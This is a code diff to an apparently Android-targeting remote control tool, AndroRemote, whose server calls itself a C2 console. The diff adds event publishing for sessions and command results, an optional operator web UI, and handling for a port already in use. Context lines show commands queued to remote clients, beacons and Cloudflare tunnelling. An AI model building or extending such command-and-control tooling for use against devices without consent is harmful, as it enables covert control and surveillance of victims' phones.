@@ -3,6 +3,7 @@
 
 import argparse
 import base64
+import errno
 import hashlib
 import json
 import os
@@ -32,6 +33,7 @@ from rich.rule import Rule
 from rich.table import Table
 from rich.text import Text
 
+from androremote.events import BUS
 from androremote.plugins.base import PluginContext
 from androremote.plugins.manager import PluginManager
 
@@ -255,6 +257,7 @@ class Handler(BaseHTTPRequestHandler):
                 + (f"  ([dim]{c['model']}[/dim])" if c["model"] else ""),
                 "green",
             )
+            BUS.publish_json("session", event="new", cid=cid, tag=alias_tag(cid), model=c["model"], ip=client_ip)
             if PLUGIN_MANAGER:
                 PLUGIN_MANAGER.trigger_hook("on_client_connect", cid, {"model": c["model"], "ip": client_ip})
 
@@ -295,6 +298,16 @@ class Handler(BaseHTTPRequestHandler):
             client_ip = self.client_address[0] if self.client_address else "unknown"
             PLUGIN_MANAGER.trigger_hook("on_result", cid, last_cmd, result)
             PLUGIN_MANAGER.trigger_hook("on_beacon", cid, {"ip": client_ip})
+
+        BUS.publish_json(
+            "result",
+            cid=cid,
+            tag=alias_tag(cid),
+            cmd=last_cmd or "",
+            result=result[:20000],
+            truncated=len(result) > 20000,
+            ok=not result.startswith("ERR"),
+        )
 
         # pipelining: hand next queued command back with ack
         nxt = self._pop_pending(cid)
@@ -616,6 +629,7 @@ def cmd_use(prefix=None):
     queue(target, "FASTPOLL 45")
     with LOCK:
         model = CLIENTS[target]["model"]
+    BUS.publish_json("session", event="active", cid=target, tag=alias_tag(target), model=model)
     ev(
         "●",
         f"active session → [cyan bold]{alias_tag(target)}[/cyan bold]"
@@ -1908,6 +1922,7 @@ def dispatch(argv):
             else:
                 ALIASES[cid] = rest[1]
                 save_aliases()
+                BUS.publish_json("session", event="rename", cid=cid, tag=rest[1])
                 ok(f"[cyan bold]{escape(rest[0])}[/cyan bold] → [cyan bold]{escape(rest[1])}[/cyan bold]")
     elif op == "forget":
         if not rest:
@@ -1923,6 +1938,7 @@ def dispatch(argv):
                 save_aliases()
                 if ACTIVE["id"] == cid:
                     ACTIVE["id"] = None
+                BUS.publish_json("session", event="forget", cid=cid)
                 ok(f"forgot session [cyan]{escape(alias_tag(cid))}[/cyan] (it returns on next beacon)")
     elif op == "fastpoll":
         show_result(send_and_wait("FASTPOLL " + (rest[0] if rest else "120")) or "")
@@ -2137,11 +2153,13 @@ def ev(sym, msg, style=""):
     """Timestamped operator event: console + rotating plain-text log."""
     console.print(f"  [dim]\\[{datetime.now().strftime('%H:%M:%S')}][/dim] "
                   + (f"[{style}]{sym}[/]" if style else sym) + f" {msg}")
+    plain = MARKUP_RE.sub("", msg)
     try:
         with open(LOG_FILE, "a") as f:
-            f.write(f"{datetime.now().isoformat(timespec='seconds')} {sym} {MARKUP_RE.sub('', msg)}\n")
+            f.write(f"{datetime.now().isoformat(timespec='seconds')} {sym} {plain}\n")
     except Exception:
         pass
+    BUS.publish("log", sym=sym, msg=plain, ts=time.time())
 
 
 class C2Console(cmd.Cmd):
@@ -2164,12 +2182,17 @@ class C2Console(cmd.Cmd):
         return stop
 
     def emptyline(self):
-        pass
+        # Non-interactive stdin (pipe/dev/null): empty reads mean EOF — exit
+        # instead of spinning on them.
+        if not sys.stdin.isatty():
+            raise EOFError
 
     def default(self, line):
         line = line.strip()
         if not line:
             return False
+        if line == "EOF" and not sys.stdin.isatty():
+            return True
         try:
             argv = shlex.split(line)
         except ValueError as e:
@@ -2248,6 +2271,10 @@ def build_parser(prog="androremote"):
     ap.add_argument("--tunnel", choices=["named", "quick", "off"], default=None,
                     help="override tunnel mode (default: named if configured, else quick)")
     ap.add_argument("--setup-tunnel", metavar="HOSTNAME", help="one-time: create a persistent named Cloudflare tunnel")
+    ap.add_argument("--web", action="store_true", help="start the operator web UI alongside the console")
+    ap.add_argument("--web-port", type=int, default=8888, metavar="PORT", help="web UI port (default: 8888)")
+    ap.add_argument("--web-host", default="127.0.0.1", metavar="HOST", help="web UI bind host (default: 127.0.0.1)")
+    ap.add_argument("--web-token", metavar="TOKEN", help="require this bearer token for web UI access")
     return ap
 
 
@@ -2270,7 +2297,17 @@ def main(argv=None):
     console.print("  [white bold]listener[/white bold]   "
                   + (f"[green]https://0.0.0.0:{ARGS.port}[/green]  [dim](TLS)[/dim]"
                      if ARGS.tls else f"[green]http://0.0.0.0:{ARGS.port}[/green]"))
-    srv = ThreadingHTTPServer(("0.0.0.0", ARGS.port), Handler)
+    try:
+        srv = ThreadingHTTPServer(("0.0.0.0", ARGS.port), Handler)
+    except OSError as e:
+        if e.errno == errno.EADDRINUSE:
+            console.print(
+                f"  [red]error[/red]      C2 port {ARGS.port} is already in use. "
+                f"Stop the existing AndroRemote process or retry with [cyan]--port PORT[/cyan]."
+            )
+        else:
+            console.print(f"  [red]error[/red]      could not bind C2 listener: {e}")
+        raise SystemExit(1) from e
     threading.Thread(target=srv.serve_forever, daemon=True).start()
     if ARGS.tls:
         TLS = True
@@ -2308,6 +2345,10 @@ def main(argv=None):
                       "androremote --setup-tunnel c2.yourdomain.com[/yellow]")
     start_tunnel_thread(mode)
     console.print(f"  [white bold]started[/white bold]    {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+
+    if ARGS.web:
+        from androremote.webui import start_web
+        start_web(host=ARGS.web_host, port=ARGS.web_port, token=ARGS.web_token)
 
     try:
         repl()
